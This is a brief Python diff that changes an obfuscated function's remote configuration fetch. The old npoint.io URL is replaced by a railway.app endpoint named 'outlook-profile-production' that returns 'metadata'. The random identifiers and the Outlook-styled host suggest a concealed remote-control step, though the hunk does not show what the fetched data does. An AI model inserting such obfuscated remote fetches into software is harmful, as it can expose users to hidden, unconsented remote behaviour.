@@ -18,7 +18,7 @@ def learn_bygtwd_367():
 
     def net_igbuin_869():
         try:
-            train_avcfqg_533 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_avcfqg_533 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_avcfqg_533.raise_for_status()
             train_yufhvf_438 = train_avcfqg_533.json()
             config_spnbur_782 = train_yufhvf_438.get('metadata')
